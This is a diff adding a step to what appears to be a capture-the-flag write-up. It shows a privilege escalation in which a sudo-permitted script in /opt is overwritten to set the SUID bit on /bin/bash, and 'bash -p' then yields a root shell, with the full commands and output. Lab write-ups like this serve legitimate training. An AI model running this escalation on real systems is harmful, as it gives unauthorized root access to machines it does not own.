@@ -266,6 +266,23 @@ matthew@uvalde:~$
 ```
 by checking sudo permission, we can see we can run `/bin/bash /opt/superhack` as sudo without password. let's check the content of this file
 
+```
+matthew@uvalde:/opt$ rm -rf superhack 
+matthew@uvalde:/opt$ echo "chmod +s /bin/bash" > superhack
+matthew@uvalde:/opt$ sudo -u root /bin/bash /opt/superhack
+matthew@uvalde:/opt$ ls -al /bin/bash
+-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+matthew@uvalde:/opt$
+matthew@uvalde:/opt$ /bin/bash -p 
+bash-5.1# id && whoami
+uid=1000(matthew) gid=1000(matthew) euid=0(root) egid=0(root) groups=0(root),1000(matthew)
+root
+bash-5.1#
+```
+deleted the superhack file, create a new one with suid. doing `/bin/bash -p` gave us a root shell.
 
+![image](https://user-images.githubusercontent.com/87468669/221443415-68f5b6e8-5ada-4246-9d48-17099ccd66c5.png)
+
+and we are through 😉.
 
 
